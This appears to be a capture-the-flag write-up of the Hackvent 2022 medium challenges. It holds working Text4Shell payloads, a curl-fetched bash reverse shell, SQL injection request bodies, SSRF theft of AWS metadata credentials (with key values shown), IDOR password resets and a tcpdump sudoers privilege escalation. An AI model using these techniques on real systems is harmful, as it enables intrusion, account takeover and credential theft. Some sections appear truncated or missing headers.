The medium 2022 Hackvent challenges covered days eight through fourteen, and
included one more hidden challenge. They get a bit more into exploitation,
with SQL injection, AWS / cloud, prototype pollution, some OSINT, and a really
interesting reflective XSS attack.

## HV22.08

### Solution

#### Profiles

With just an image and a handle, searching around common social media sites
finds two. Hackventsanta is on Linkedin at
<https://www.linkedin.com/in/hackventsanta/>:

![image-20221207200724605](https://0xdfimages.gitlab.io/img/image-20221207200724605.png)

Under contact info, he lists this page as well as a GitHub page:

![image-20221207200750976](https://0xdfimages.gitlab.io/img/image-20221207200750976.png)

HACKventSanta is also on Instagram at
<https://www.instagram.com/hackventsanta/>:

![image-20221207200830097](https://0xdfimages.gitlab.io/img/image-20221207200830097.png)

The GitHub page is linked in the profile there as well.

#### GitHub

That GitHub profile has only one Repo:

![image-20221207200914429](https://0xdfimages.gitlab.io/img/image-20221207200914429.png)

It shows only a Zip archive, a README, and a single release:

![image-20221207200948893](https://0xdfimages.gitlab.io/img/image-20221207200948893.png)

The Zip contains an HTML file:

    
    
    <!--Simple Html with saying nothing here-->
    <!DOCTYPE html>
    <html>
    <head>
    <title>Nothing here</title>
    </head>
    <body>
    <h1>No viruses alive here ü§î cant say anything about tags</h1>
    </body>
    </html>
    

I spent a few minutes trying some Google dorks to look for pages with that
title, or perhaps that comment, but didn‚Äôt find anything useful.

But the page does mention ‚Äútags‚Äù, which is what the latest release is called:

![image-20221207201104301](https://0xdfimages.gitlab.io/img/image-20221207201104301.png)

There‚Äôs a file named `Undetected`.

#### ELF

`Undetected` is a Linux ELF executable:

    
    
    $ file Undetected 
    Undetected: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ed87578ddf875b9911abf41472ed1b68ccc21cf4, for GNU/Linux 3.2.0, not stripped
    

Opening it in Ghidra, `main` just prints some messages:

    
    
    undefined8 main(void)
    
    {
      puts("I am innocent! ");
      puts("I am not a hacker ");
      puts("This is not a virus ");
      puts("I can only give you key which you might need: ");
      puts(" ThisIsTheKeyToReceiveTheGiftFromSanta ");
      puts("But Go ahead and check my md5, I swear I am undetected! ");
      return 0;
    }
    

#### VirusTotal

When the above mentions ‚Äúchecking a hash‚Äù, and ‚ÄúI‚Äôm undetected‚Äù, the first
thing I think of is VirusTotal.

I‚Äôll get the hash of the file:

    
    
    $ md5sum Undetected 
    613e91815cd44501bfa9c2c30cc06097  Undetected
    

And search for it on VT, finding [this
page](https://www.virustotal.com/gui/file/4d0e17d872f1d5050ad71e0182073b55009c56e9177e6f84a039b25b402c0aef/detection):

![image-20221207201414670](https://0xdfimages.gitlab.io/img/image-20221207201414670.png)

It agrees, this is not flagged by any AV. There‚Äôs a community comment:

![image-20221207201446969](https://0xdfimages.gitlab.io/img/image-20221207201446969.png)

#### Twitter

SwissSanta2022‚Äôs [Twitter profile](https://twitter.com/SwissSanta2022) looks
promising:

![image-20221207201551240](https://0xdfimages.gitlab.io/img/image-20221207201551240.png)

There are three posts, all QRCodes. The most recent leads to a RickRoll on
YouTube. The second leads to `evilsanta.mp3` hosted
[here](https://qr1.be/H8YX). I could download it and look for clues, but the
third is a Google Drive link that asks for a password:

![image-20221207201807001](https://0xdfimages.gitlab.io/img/image-20221207201807001.png)

The binary mentioned a key, ‚ÄúThisIsTheKeyToReceiveTheGiftFromSanta‚Äù, which
I‚Äôll enter, and it opens, showing `SANTAAAAAAAA.pdf`:

![image-20221207201910232](https://0xdfimages.gitlab.io/img/image-20221207201910232.png)

The base64-encoded string at the top decodes to a flag:

    
    
    $ echo "SFYyMntIT0hPK1NBTlRBK0dJVkVTK0ZMQUdTK05PVCtWSVJVU30=" | base64 -d
    HV22{HOHO+SANTA+GIVES+FLAGS+NOT+VIRUS}
    

**Flag:`HV22{HOHO+SANTA+GIVES+FLAGS+NOT+VIRUS}`**

There‚Äôs an docker I can spin up that presents a webpage:

![image-20221208212637059](https://0xdfimages.gitlab.io/img/image-20221208212637059.png)

### Solution

#### ROT13

Entering text into the ‚ÄúSearch gift‚Äù field returns a new page with that text
displayed back after a ROT13 translation. If I enter ‚Äú0xdf was here‚Äù, it
shows:

![image-20221208212810811](https://0xdfimages.gitlab.io/img/image-20221208212810811.png)

I‚Äôll note the URL for this new page is `/santa/attack?search=0xdf+was+here`

#### Failures

This felts for sure like it was going to be a server-side template injection
(SSTI) bug, but nothing I tried worked, including a lot of test payloads, and
those same payloads ROT13ed.

My next thought was a command injection. There‚Äôs talk of using shell for text in the prompt, so perhaps the site is calling on the system to do something like `echo "$userinput" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`. To test this, I‚Äôll try closing quotes, adding `;`, and adding subshells (like `$(id)` and with backticks). None of these worked.

There is also a HTML injection / cross site scripting (XSS) bug in this page.
If I take `<script>alert(1)</script>`, ROT13 to `<fpevcg>nyreg(1)</fpevcg>`,
and send that, it pops an alert:

![image-20221209112714017](https://0xdfimages.gitlab.io/img/image-20221209112714017.png)

Still, to exploit this, there would have to be some way to get this in front
of another user. Because the form sends a GET request, I could use a link for
phishing, but even then, which user, and what is worth trying to steal. The
site lacks any kind of login or cookies or admin panel that I can find.

#### Text4Shell

Text4Shell (CVE-2022-4289) is very similar to a SSTI bug, in that user
submitted text is being processed as code rather than text. Patlo Alto has a
[nice post](https://www.paloaltonetworks.com/blog/prisma-
cloud/analysis_of_cve-2022-42889_text4shell_vulnerability/) describing it in
detail. There‚Äôs also a POC available on [this
page](https://github.com/securekomodo/text4shell-poc):

    
    
    ${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/itworked')}
    

I‚Äôll first try:

    
    
    ${script:javascript:java.lang.Runtime.getRuntime().exec('id')}
    

Both in that form and after a ROT13, the ROT13 text just comes back on the
page. It doesn‚Äôt seem like it‚Äôs executing. But it could be executing blind,
and not showing the results.

I‚Äôll connect to the HackLab VPN, and try another payload:

    
    
    ${script:javascript:java.lang.Runtime.getRuntime().exec('ping -c 1 10.13.0.22')}
    

On ROT13-encoding this and submitting, the text is the same:

![image-20221209115927405](https://0xdfimages.gitlab.io/img/image-20221209115927405.png)

But there‚Äôs ICMP at my `tcpdump`:

    
    
    oxdf@hacky$ sudo tcpdump -ni tun0 icmp
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
    02:10:59.225938 IP 152.96.7.3 > 10.13.0.22: ICMP echo request, id 29441, seq 0, length 64
    02:10:59.225983 IP 10.13.0.22 > 152.96.7.3: ICMP echo reply, id 29441, seq 0, length 64
    

That‚Äôs code execution.

#### Shell

Getting a reverse shell was a bit trickier than expected. These kind of
vulnerabilities are always finicky with pipes and redirects, so I‚Äôm not
surprised that a standard Bash reverse shell didn‚Äôt work.

My preferred way to get a shell is to write a quick Bash script that returns a
shell, `shell.sh`:

    
    
    #!/bin/bash
    
    bash -i >& /dev/tcp/10.13.0.22/443 0>&1
    

I‚Äôll host that using a Python webserver, and upload it with the first command,
and execute it with the second:

    
    
    ${script:javascript:java.lang.Runtime.getRuntime().exec('curl 10.13.0.22/shell.sh -o /tmp/0xdf')}
    ${script:javascript:java.lang.Runtime.getRuntime().exec('bash /tmp/0xdf')}
    

On submitting the ROT13ed first command, there‚Äôs a connection at the
webserver:

    
    
    152.96.7.3 - - [09/Dec/2022 02:15:20] "GET /shell.sh HTTP/1.1" 200 -
    

On submitting the second, there‚Äôs a connect at my listening `nc`:

    
    
    $ nc -lnvp 443
    Listening on 0.0.0.0 443
    Connection received on 152.96.7.3 34758
    bash: cannot set terminal process group (283): Not a tty
    bash: no job control in this shell
    bash-5.1#
    

The flag is in `/SANTA/FLAG.txt`:

    
    
    bash-5.1# cat SANTA/FLAG.txt
    HV22{th!s_Text_5h‚Ç¨LL_Com‚Ç¨5_‚Ç£‚Çπ0M_SANTAA!!}
    

**Flag:`HV22{th!s_Text_5h‚Ç¨LL_Com‚Ç¨5_‚Ç£‚Çπ0M_SANTAA!!}`**

There‚Äôs a docker that returns the following page:

![image-20221210144031188](https://0xdfimages.gitlab.io/img/image-20221210144031188.png)

### Solution

#### Enumeration

I can register for the site and log in, which leads to `/notes`, and an empty
page, but with button at the top right for ‚ÄúMy Notes‚Äù, ‚ÄúNew‚Äù, and ‚ÄúProfile‚Äù.

‚ÄúNew‚Äù offers a form to make a note:

![image-20221210144811272](https://0xdfimages.gitlab.io/img/image-20221210144811272.png)

They show up on `/notes`:

![image-20221210144855886](https://0xdfimages.gitlab.io/img/image-20221210144855886.png)

Clicking on one offers a chance to update it:

![image-20221210144918139](https://0xdfimages.gitlab.io/img/image-20221210144918139.png)

`/profile` offers a chance to change my password or log out:

![image-20221210144941952](https://0xdfimages.gitlab.io/img/image-20221210144941952.png)

#### Via SQL Injection

There‚Äôs an SQL injection in the `/api/note/update` endpoint that is contacted
via AJAX when I update a note. A benign request to this looks like:

    
    
    POST /api/note/update HTTP/2
    Host: 497cc3d7-1f89-416a-9a5b-8e799e92a3fe.idocker.vuln.land

    {"id":1,"note":"new data","userId":1,"createdAt":"2022-12-10T19:17:56.740Z","updatedAt":"2022-12-10T19:17:56.740Z"}
    

The response looks like:

    
    
    HTTP/2 200 OK
    Content-Type: application/json; charset=utf-8
    Date: Sat, 10 Dec 2022 19:18:42 GMT
    Etag: W/"11-T5hvIIrIKzCvu6IzKKOWkDyp8vY"
    X-Powered-By: Express
    Content-Length: 17
    
    {"msg":"Updated"}
    

Sending this request over to Burp Repeater, I‚Äôll notice that if I set the
`note` field to `'`, it crashes:

![image-20221210150617229](https://0xdfimages.gitlab.io/img/image-20221210150617229.png)

I can guess that the backend is doing something like:

    
    
    UPDATE notes SET note='{request.note}' WHERE id = {request.id};
    

I‚Äôll create two notes and note their ids (from the URL for viewing them, which
is `/note/{id}`):

![image-20221210150933638](https://0xdfimages.gitlab.io/img/image-20221210150933638.png)

I‚Äôll send this request:

    
    
    {
        "id":3,
        "note":"injected!' where id=2;-- -",
        "userId":2,
        "createdAt":"2022-12-10T19:48:15.918Z",
        "updatedAt":"2022-12-10T19:48:15.918Z"
    }
    

It reports success. If this were not injectable, it would show the new note
all the way to the semi-colon and the dashes in note 3 (replacing ‚Äúsecond
note‚Äù). But it shows just ‚Äúinjected!‚Äù:

![image-20221210151208742](https://0xdfimages.gitlab.io/img/image-20221210151208742.png)

This database also allows for stacked queries. I can test that with this:

    
    
    {
        "id":3,
        "note":"note id3' where id=3; update notes set note='stacked' where id=2;-- -",
        "userId":2,"createdAt":"2022-12-10T19:48:15.918Z"
        ,"updatedAt":"2022-12-10T19:48:15.918Z"
    }
    

After submitting this, both notes are updated:

![image-20221210151550138](https://0xdfimages.gitlab.io/img/image-20221210151550138.png)

Now I have a way to get arbitrary data into one of my notes. For example, to
get the DB version, I‚Äôll try running `version()`:

    
    
    {
        "id":3,
        "note":"note id3' where id=3; update notes set note=version() where id=2;-- -",
        "userId":2,
        "createdAt":"2022-12-10T19:48:15.918Z",
        "updatedAt":"2022-12-10T19:48:15.918Z"
    }
    

![image-20221210151703950](https://0xdfimages.gitlab.io/img/image-20221210151703950.png)

Postgres allows for [string
concatenation](https://www.postgresqltutorial.com/postgresql-string-
functions/postgresql-concat-function/) using the `||` operator. That means I
can make a much more simple query without stacking:

    
    
    {
        "id":3,
        "note":"version: ' || version() || '",
        "userId":1,
        "createdAt":"2022-12-10T20:19:12.116Z",
        "updatedAt":"2022-12-10T20:19:12.116Z"
    }
    

![image-20221210152048353](https://0xdfimages.gitlab.io/img/image-20221210152048353.png)

I can use this to read other notes. If I try to read all at once, it crashes:

![image-20221210152839258](https://0xdfimages.gitlab.io/img/image-20221210152839258.png)

But, if I filter, I can read one. For example, note with id 2 say as much:

![image-20221210152913037](https://0xdfimages.gitlab.io/img/image-20221210152913037.png)

I‚Äôll update 3 to contain the note from 2:

    
    
    {
        "id":3,
        "note":"note: ' || (SELECT note from notes where id = 2) || '",
        "userId":1,
        "createdAt":"2022-12-10T20:19:12.116Z",
        "updatedAt":"2022-12-10T20:19:12.116Z"
    }
    

Now it matches:

![image-20221210153019777](https://0xdfimages.gitlab.io/img/image-20221210153019777.png)

If I don‚Äôt know the ID of the note I want to read, I can just use `LIMIT 1
OFFSET X` to read different notes. For example:

    
    
    {
        "id":3,
        "note":"note: ' || (SELECT note from notes LIMIT 1 OFFSET 1) || '",
        "userId":1,
        "createdAt":"2022-12-10T20:19:12.116Z",
        "updatedAt":"2022-12-10T20:19:12.116Z"
    }
    

Sets my note 3 to the note of another user I shouldn‚Äôt be able to read:

![image-20221210153303079](https://0xdfimages.gitlab.io/img/image-20221210153303079.png)

In fact, the note at `OFFSET 0` is the flag:

![image-20221210153328585](https://0xdfimages.gitlab.io/img/image-20221210153328585.png)

#### Via SQLI and Fuzzing

My original solve, instead of doing `LIMIT 1 OFFSET X`, I went looking for
note ids that I couldn‚Äôt read. I notice that there‚Äôs a different response code
for tickets that don‚Äôt exist and tickets that do but are owned by a different
user.

For demonstration, I‚Äôll create two accounts. The one for the current cookie
has notes 1,2,3, and the other has note 4. I‚Äôll fuzz:

1-3 return 200. 4 returns 403 Forbidden, and the rest return 404. So I‚Äôll fuzz
a much bigger range, filtering 200 and 404:

It finds the note at id 1337. I can read that the same way as above:

    
    
    {
        "id":3,
        "note":"flag: ' || (SELECT note from notes where id = 1337) || '",

        "updatedAt":"2022-12-10T20:19:12.116Z"
    }

#### Via IDOR in Password Reset

I‚Äôll note that when I update my password, it sends a POST request:

    
    
    POST /api/user/1 HTTP/2
    Host: eeb549eb-1f70-4bff-b850-672676adf861.idocker.vuln.land

The response contains what looks like the entire user object:

I can do a similar fuzz, and note that users that exist return 200, and others
return 404:

    
    
    $ wfuzz -z range,1-5 -H 'Content-Type: application/json' -b 'connect.sid=s%3AdLGvo1OZyvTe3IryEFvAgobTB8YBp-vN.QRR8ZbgMppUeKXSKgQhFkKu4rT2syEnHrUCGBWawqaw' -d '{"password":"0xdf"}' 'https://eeb549eb-1f70-4bff-b850-672676adf861.idocker.vuln.land/api/user/FUZZ'

So I can fuzz all users, and user id 1337 is real as well:

    
    
    $ wfuzz -z range,1-10000 --hc 404 -H 'Content-Type: application/json' -b 'connect.sid=s%3AdLGvo1OZyvTe3IryEFvAgobTB8YBp-vN.QRR8ZbgMppUeKXSKgQhFkKu4rT2syEnHrUCGBWawqaw' -d '{"password":"0xdf"}' 'https://eeb549eb-1f70-4bff-b850-672676adf861.idocker.vuln.land/api/user/FUZZ'

Not only did that find the user, it also set their password to 0xdf. But I
still don‚Äôt know the password. I‚Äôll reset that user‚Äôs password again in Burp
Repeater and note the response:

![image-20221210155911944](https://0xdfimages.gitlab.io/img/image-20221210155911944.png)

Now I can log in as Santa and get the flag:

**Flag:`HV22{Sql1_is_An_0Ld_Cr4Ft}`**

![image-20221211134456679](https://0xdfimages.gitlab.io/img/image-20221211134456679.png)

If I give it my blog, it gets the top of the page:

![image-20221211134531859](https://0xdfimages.gitlab.io/img/image-20221211134531859.png)

### Solution

#### Page Analysis

The page itself has some hints on it. There‚Äôs a Powered by AWS statement /
logo at the bottom of the page. And, typically when Hackvent wants me to hack
a site, I get my own instance, not just some instance on the internet. There
must be a reason it‚Äôs in AWS.

Beyond that, it says ‚ÄúSo Meta :D‚Äù. That‚Äôs a reference to the [AWS Instance
Metadata
Service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-
instance-metadata-service.html) (IMDS), an API which is available in EC2
instances at the IP 169.254.169.254.

Looking at the page source, the images are loaded from
`https://hackvent2022.s3.eu-west-2.amazonaws.com/`:

![image-20221211135029972](https://0xdfimages.gitlab.io/img/image-20221211135029972.png)

#### S3 Analysis

Looking at that S3 bucket, it has three files in it:

![image-20221211135412721](https://0xdfimages.gitlab.io/img/image-20221211135412721.png)

`flag1.txt` is obviously interesting. And I can access it:

    
    
    Congratulations! You've found .... oh no wait
    
    Santa told us that sometimes S3 buckets aren't so secure :/
    
    We've added an extra step to make sure the flag doesn't get breached, we split it in two and put the other half somewhere .... Secret ;)
    
    Here's the first half anyway:
    
    HV22{H0_h0_h0_H4v3_&_
    

#### Security-Credentials

I‚Äôll use the website load (basically an SSRF) to read from the IMDS. For
example, at `http://169.254.169.254/latest/`:

![image-20221211164246373](https://0xdfimages.gitlab.io/img/image-20221211164246373.png)

At `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, I‚Äôll
find any credentials I can use to interact with the AWS service. There‚Äôs one:

![image-20221211164406372](https://0xdfimages.gitlab.io/img/image-20221211164406372.png)

At `http://169.254.169.254/latest/meta-data/iam/security-credentials/Hackvent-
SecretReader-EC2-Role`, there‚Äôs a blob with the data for the credentials:

![image-20221211164452842](https://0xdfimages.gitlab.io/img/image-20221211164452842.png)

Getting these out is a huge pain, and less than a day into the challenge they
added it so that on this URL, the result is included in the page source:

![image-20221211164553207](https://0xdfimages.gitlab.io/img/image-20221211164553207.png)

#### Interacting with Secrets Manager

[This document from
AWS](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-
resources.html) shows how to use the temporary credentials from IMDS. Without
doing anything, I can try to read information about the S3 bucket:

    
    
    oxdf@hacky$ aws s3 ls hackvent2022
    Unable to locate credentials. You can configure credentials by running "aws configure".
    

I‚Äôll run `aws configure`, and add in a regoin:

    
    
    oxdf@hacky$ aws configure
    AWS Access Key ID [None]: 
    AWS Secret Access Key [None]: 
    Default region name [None]: eu-west-2
    Default output format [None]: 
    

Now I‚Äôll export the temp credentials as environment variables:

    
    
    oxdf@hacky$ export AWS_ACCESS_KEY_ID=ASIA4G76YFUNFZM5UFVS
    oxdf@hacky$ export AWS_SECRET_ACCESS_KEY=WaGRJXtrqv+hqHx9PNqfnhCj5PugCt9wz7XS03XT

Now I can read from S3:

    
    
    oxdf@hacky$ aws s3 ls hackvent2022
    2022-11-05 17:34:55      57382 3723050.png
    2022-11-06 02:48:24      10936 aws-logo-500x500.webp
    2022-11-05 17:34:56        306 flag1.txt
    

There are a ton of services that I could try to interact with them, but most
return that they are not vlaid with these creds. There‚Äôs two hints as to where
to look. First, the text from the first half of the flag says ‚Äúput the other
half somewhere ‚Ä¶. Secret ;)‚Äù. Also, the credential name is ‚ÄúHackvent-
SecretReader-EC2-Role‚Äù. Both of these have to do with secrets.

Running `aws help` will show all the various services that it can interact
with. Searching in that page for secret shows an interesting one:

![image-20221211165540075](https://0xdfimages.gitlab.io/img/image-20221211165540075.png)

`aws secretsmanager help` shows there‚Äôs a `list-secrets` sub-command, and it
returns one secret:

    
    
    oxdf@hacky$ aws secretsmanager list-secrets
    {
        "SecretList": [
            {
                "ARN": "arn:aws:secretsmanager:eu-west-2:839663496474:secret:flag2-UjomOM",
                "Name": "flag2",
                "Description": "Flag for hackvent 2022",
                "LastChangedDate": 1670706291.135,
                "LastAccessedDate": 1670716800.0,
                "Tags": [],
                "SecretVersionsToStages": {
                    "3cb95787-eea6-475b-9b5b-16bac83b449d": [
                        "AWSPREVIOUS"
                    ],
                    "8a498b78-e73f-4a97-a0c3-74f365d3aa0d": [
                        "AWSCURRENT"
                    ]
                }
            }
        ]
    }
    

The `get-secret-value` sub-command requires `--secret-id`. I‚Äôll give it the
name and it works:

    
    
    oxdf@hacky$ aws secretsmanager get-secret-value 
    usage: aws [options] <command> <subcommand> [<subcommand> ...] [parameters]
    To see help text, you can run:
    
      aws help
      aws <command> help
      aws <command> <subcommand> help
    aws: error: the following arguments are required: --secret-id

The second hidden flag shows up in day 11.

### Solution

Looking at the text around the second half of the day 11 flag, it ends with:

> Oh I forgot to mention I overheard some of the elves talking about making
> tags available ‚Ä¶ maybe they mean gift tags?! Who knows ‚Ä¶ maybe you can make
> something out of that ‚Ä¶ or not :D

returns:

terminal:

### Solution

#### Enumeration

In santa‚Äôs home directory is the script references in the description:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> ls -la
    total 8
    drwxr-sr-x    1 santa    santa            6 Dec 12 18:06 .
    drwxr-xr-x    1 root     root            19 Nov 20 18:42 ..
    -rw-r--r--    1 santa    santa          211 Nov 20 18:49 .ash_history
    -rwxr-xr-x    1 santa    santa          196 Nov 20 18:49 santa-script.sh
    

It‚Äôs quite simple:

    
    
    #!/bin/ash
    echo "$(date)" >> /var/log/wishlist.log
    curl -k https://brick-steep-tower.glitch.me/api/wishlist/items | jq .[].name >> /var/log/wishlist.log
    echo "---------" >> /var/log/wishlist.log
    

The log file is there, but santa can‚Äôt read it:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> ls -l /var/log/
    total 4
    drwxr-xr-x    1 root     root            28 Nov 20 18:42 go-dnsmasq
    -rwx-w--w-    1 root     root           420 Nov 20 18:51 wishlist.log
    

But, santa can with `sudo`:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> ls -l /var/log/
    total 4
    drwxr-xr-x    1 root     root            28 Nov 20 18:42 go-dnsmasq
    -rwx-w--w-    1 root     root           420 Nov 20 18:51 wishlist.log
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> sudo -l
    Matching Defaults entries for santa on d41998fe-ebd1-4f6c-ba21-7a56e42134c7:
        secure_path=/usr/foobar\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User santa may run the following commands on d41998fe-ebd1-4f6c-ba21-7a56e42134c7:
        (root) NOPASSWD: /usr/bin/less /var/log/*
        (root) NOPASSWD: !/usr/bin/less /var/log/*..*
        (root) NOPASSWD: !/usr/bin/less /var/log/* *
        (root) NOPASSWD: /usr/bin/tcpdump
    

It seems the admin has set santa up to read the log and also run `tcpdump`.
The middle two lines are preventing santa from reading files outside of
`/var/log`.

It‚Äôs also worth noting that `sudo` is setting the `PATH` to start with
`/usr/foobar`. This path has a handful of common binaries, but each with
screwy results:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/usr/foobar> ls 
    awk      cat      diff     find     gnugrep  grep     head     ls       more     nl       sed      strings  tac      tail
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/usr/foobar> ./awk
    https://www.youtube.com/watch?v=dQw4w9WgXcQ
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/usr/foobar> ./cat
    Meow - I like cats
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/usr/foobar> ./more
    Hit the road Jack and dont you come back no more, no more, no more, no more
    

So I‚Äôll probably want to avoid using any of these (I actually didn‚Äôt run into
these until after solving, but it seems they did cause others issues).

#### tcpdump GTFObin Explanation

The example to run from
[GTFObins](https://gtfobins.github.io/gtfobins/tcpdump/) is this:

    
    
    COMMAND='id'
    TF=$(mktemp)
    echo "$COMMAND" > $TF
    chmod +x $TF
    sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
    

It is putting a command into a temp file, making it executable, and then
calling `tcpdump` with the following arguments:

  * `-l` \- Make stdout line buffered (not actually necessary).
  * `-n` \- Don‚Äôt convert addresses to names (not actually necessary).
  * `-i lo` \- Listen on loopback. I‚Äôll change this to something that will get traffic on this challenge.
  * `-w /dev/null` \- Write the results to `/dev/null`. Since I don‚Äôt actually care about the results, just throw them away. Still, it is important for `tcpdump` to be writing to a file.
  * `-G 1` \- Will rotate the output file every 1 second.
  * `-W 1` \- Will limit the number of rotated files to 1.
  * `-z $TF` \- Sets `$TF` as the ‚Äúpost rotate command‚Äù. This is tyically used to apply compression or some processing to saved files, but here it‚Äôs being abused to run my script.
  * `-Z root` \- This sets the user that `tcpdump` tries to drop to after opening the capture device but before saving any data to root, effectively preventing that drop.

This will capture until it gets a hit and then one second later rotate, apply
the script to the file, and then exit for hitting the max number of files.

#### tcpdump GTFObin POC

I‚Äôll write a script that just touches a file in `/tmp`:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> echo -e '#!/bin/bash\n\ntouch /tmp/pwned'
    #!/bin/bash
    
    touch /tmp/pwned
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> echo -e '#!/bin/bash\n\ntouch /tmp/pwned' > /tmp/0xdf.sh
    santa@730c9b95-fd48-4d50-a446-4fb660e028d0:/home/santa> chmod +x /tmp/0xdf.sh
    

Now I‚Äôll run `tcpdump` as described above:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> sudo tcpdump -ln -i any -w /dev/null -W 1 -G 1 -z /tmp/0xdf.sh
    tcpdump: data link type LINUX_SLL2
    tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
    Maximum file limit reached: 1
    1 packet captured
    2 packets received by filter
    0 packets dropped by kernel
    

I do have to change the interface it‚Äôs listening on, as the example only
listens on loopback, and won‚Äôt get any traffic to trigger the run.

It exits, and the file is there:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> ls -l /tmp/
    total 4
    -rwxr-xr-x    1 santa    santa           30 Dec 12 13:25 0xdf.sh
    -rw-r--r--    1 root     root             0 Dec 12 13:26 pwned
    

#### Shell as root

Getting this execution as root to actually do something that returns a root
shell was a bit tricky, but eventually I‚Äôll get it by writing to the `sudoers`
file. I‚Äôll update my script:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> echo -e '#!/bin/bash\n\necho "santa   ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > /tmp/0xdf.sh
    

Now I‚Äôll trigger it with `tcpdump`:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> sudo tcpdump -ln -i any -w /dev/null -W 1 -G 1 -z /tmp/0xdf.sh
    tcpdump: data link type LINUX_SLL2
    tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
    Maximum file limit reached: 1
    1 packet captured
    2 packets received by filter
    0 packets dropped by kernel
    

Santa can now run all commands as root without a password:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> sudo -l
    Matching Defaults entries for santa on d41998fe-ebd1-4f6c-ba21-7a56e42134c7:
        secure_path=/usr/foobar\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User santa may run the following commands on d41998fe-ebd1-4f6c-ba21-7a56e42134c7:
        (root) NOPASSWD: /usr/bin/less /var/log/*
        (root) NOPASSWD: !/usr/bin/less /var/log/*..*
        (root) NOPASSWD: !/usr/bin/less /var/log/* *
        (root) NOPASSWD: /usr/bin/tcpdump
        (ALL) NOPASSWD: ALL
    

`sudo -i` will give a root shell:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> sudo -i
    d41998fe-ebd1-4f6c-ba21-7a56e42134c7:~#
    

And read the flag:

    
    
    d41998fe-ebd1-4f6c-ba21-7a56e42134c7:~/secret# cat flag.txt 
    HV22{M4k3-M3-a-S4ndW1ch}
    

**Flag:`HV22{M4k3-M3-a-S4ndW1ch}`**

#### less GTFObin

Initially I went with `less` as it‚Äôs easier to exploit. Typically it‚Äôs [easier
to exploit](https://gtfobins.github.io/gtfobins/less/#sudo). However, when I
hit `!`, nothing happened. At first it looks like that‚Äôs because root is
running with the environment variable `LESSSECURE` set to 1:

    
    
    d41998fe-ebd1-4f6c-ba21-7a56e42134c7:~/secret# env | grep LES
    LESSSECURE=1
    

From the [man page](https://man7.org/linux/man-
pages/man1/less.1.html#SECURITY):

> SECURITY When the environment variable LESSSECURE is set to 1, less runs in
> a ‚Äúsecure‚Äù mode. This means these features are disabled:

>  

Interestingly, while the author _tried_ to use `LESSSECURE`, it doesn‚Äôt work
on the Busybox version of `less` on an Apline container. I think that‚Äôs also
why `!` doesn‚Äôt work. But `:e` to examine a new file does work, as I‚Äôm able to
read other files with it. For example, I can read root‚Äôs `.ash_history`:

![image-20221212124823580](https://0xdfimages.gitlab.io/img/image-20221212124823580.png)

Which opens:

![image-20221212124835148](https://0xdfimages.gitlab.io/img/image-20221212124835148.png)

Then I can read `flag.txt` the same way:

terminal:

![image-20221213075029257](https://0xdfimages.gitlab.io/img/image-20221213075029257.png)

### Solution

#### Enumeration

The site is _very_ similar to the ‚ÄúNotme‚Äù site from day 10. I can register and
get access to the same menu as before:

![image-20221213075204969](https://0xdfimages.gitlab.io/img/image-20221213075204969.png)

After creating a note, it shows up on `/notes`:

![image-20221213075246783](https://0xdfimages.gitlab.io/img/image-20221213075246783.png)

There‚Äôs no option to edit notes this time. Clicking on a note does nothing.

#### Requests

Looking at the various requests, creating a note sends a POST with body
`{"note":"Note 1"}` to `/api/note/new`. The response looks like the full note
object:

    
    
    HTTP/2 200 OK
    Content-Type: application/json; charset=utf-8
    Date: Tue, 13 Dec 2022 12:52:12 GMT
    Etag: W/"71-XuuFUOZqoKqUxJQ8CINFAP5V4X8"
    X-Powered-By: Express
    Content-Length: 113
    
    {"id":1,"note":"Note 1","userId":1,"updatedAt":"2022-12-13T12:52:12.941Z","createdAt":"2022-12-13T12:52:12.941Z"}
    

Loading the main page sends a GET to `/api/note/all`, and gets back a list of
these same note objects.

Updating my password from the ‚ÄúProfile‚Äù page sends a POST to `/api/user/1` (my
userid is 1) with the body of `{"password":"new_pass"}` and the response
contains my full user object:

    
    
    HTTP/2 200 OK
    Content-Type: application/json; charset=utf-8
    Date: Tue, 13 Dec 2022 12:53:15 GMT
    Etag: W/"c4-GX4DUFOYYoUAZBOvx8VF6ijLSyg"
    X-Powered-By: Express
    Content-Length: 196
    
